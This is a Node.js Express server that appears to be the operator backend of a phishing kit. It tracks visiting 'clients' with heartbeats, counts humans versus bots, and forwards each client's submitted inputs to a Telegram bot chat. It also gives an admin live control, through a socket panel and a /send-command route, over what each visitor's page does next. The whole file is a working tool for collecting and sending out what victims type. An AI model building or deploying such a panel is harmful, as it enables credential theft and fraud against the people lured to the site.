const express = require('express');
const axios = require('axios');
const { Sequelize, DataTypes } = require('sequelize');
const http = require('http');
const socketIO = require('socket.io');
const app = express();
const server = http.createServer(app);
const io = socketIO(server);


app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

const TELEGRAM_API_TOKEN = 'YOUR_TELEGRAM_API_TOKEN';
const TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID';
const PORT = process.env.PORT || 3000;

// Initialize Sequelize with SQLite
const sequelize = new Sequelize('sqlite::memory:');

const Client = sequelize.define('Client', {
    id: {
        type: DataTypes.STRING,
        primaryKey: true
    },
    command: {
        type: DataTypes.STRING,
        defaultValue: 'not'
    },
    data: {
        type: DataTypes.JSON,
        defaultValue: {}
    },
    lastSeen: {
        type: DataTypes.DATE,
        defaultValue: DataTypes.NOW
    }
});

const Stats = sequelize.define('Stats', {
    visitors: {
        type: DataTypes.INTEGER,
        defaultValue: 0
    },
    humans: {
        type: DataTypes.INTEGER,
        defaultValue: 0
    },
    bots: {
        type: DataTypes.INTEGER,
        defaultValue: 0
    }
});

// Sync database models
sequelize.sync().then(async () => {
    // Initialize stats if not present
    let stats = await Stats.findOne();
    if (!stats) {
        await Stats.create();
    }
});

// Middleware to track visitors
app.use(async (req, res, next) => {
    const stats = await Stats.findOne();
    stats.visitors++;
    await stats.save();
    next();
});

// Function to broadcast to the admin panel
const broadcastAdminPanel = async () => {
    const clients = await Client.findAll();
    const stats = await Stats.findOne();
    io.emit('adminPanelUpdate', { clients, stats });
};

// Function to update client data
const updateClientData = async (clientId, data) => {
    let client = await Client.findByPk(clientId);
    if (!client) {
        client = await Client.create({ id: clientId });
    }
    client.data = data;
    client.lastSeen = new Date();
    await client.save();
    broadcastAdminPanel();
};

// Function to delete a client
const deleteClient = async (clientId) => {
    await Client.destroy({ where: { id: clientId } });
    broadcastAdminPanel();
};

// Route to handle client data updates
app.post('/client-data', async (req, res) => {
    const { clientId, data } = req.body;
    await updateClientData(clientId, data);
    const client = await Client.findByPk(clientId);
    res.send({ command: client.command });
});

// Route to handle heartbeats
app.post('/heartbeat', async (req, res) => {
    const { clientId } = req.body;
    const client = await Client.findByPk(clientId);
    if (client) {
        client.lastSeen = new Date();
        await client.save();
    }
    res.send({ command: client ? client.command : 'not' });
});

// Route to handle inputs from clients
app.post('/inputs', async (req, res) => {
    const { clientId, data } = req.body;

    // Send data to Telegram
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_API_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: `Client ${clientId}: ${JSON.stringify(data)}`
    });

    // Update client command to "not" and create client if not exists
    let client = await Client.findByPk(clientId);
    if (!client) {
        client = await Client.create({ id: clientId });
    }
    client.command = 'not';
    await client.save();
    res.sendStatus(200);
});

// Route to handle admin commands
app.post('/send-command', async (req, res) => {
    const { clientId, command } = req.body;
    const client = await Client.findByPk(clientId);
    if (client) {
        client.command = command;
        await client.save();
    }
    res.sendStatus(200);
});

// Periodically remove inactive clients
setInterval(async () => {
    const now = Date.now();
    const clients = await Client.findAll();
    for (const client of clients) {
        if (now - new Date(client.lastSeen).getTime() > 60000) { // 1 minute inactivity
            await deleteClient(client.id);
        }
    }
}, 60000);

// WebSocket connection
io.on('connection', async (socket) => {
    console.log('Admin connected');
    const clients = await Client.findAll();
    const stats = await Stats.findOne();
    socket.emit('adminPanelUpdate', { clients, stats });
});

server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
}); 